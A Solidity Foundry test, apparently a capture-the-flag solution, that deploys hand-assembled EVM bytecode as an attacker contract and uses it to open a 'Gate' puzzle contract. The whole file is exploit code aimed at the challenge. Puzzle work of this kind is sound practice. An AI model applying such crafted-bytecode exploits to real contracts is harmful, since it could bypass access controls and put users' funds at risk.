pragma solidity ^0.8.17;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../src/Gate.sol";

contract GateTest {
    address atk;
    Gate gate;

    function setUp() public {
        gate = new Gate();
        bytes
            memory bytecode = hex"6020600c60003960206000f334343560fe1c600111600d57fe5b3515601757326019565b335b3452602034f3";

        assembly {
            sstore(atk.slot, create(0, add(bytecode, 0x20), mload(bytecode)))
        }
    }

    function testHack() public {
        gate.open(address(atk));
        console.log("Gate opened? ", gate.opened());
        require(gate.opened(), "Gate not opened");
    }
}
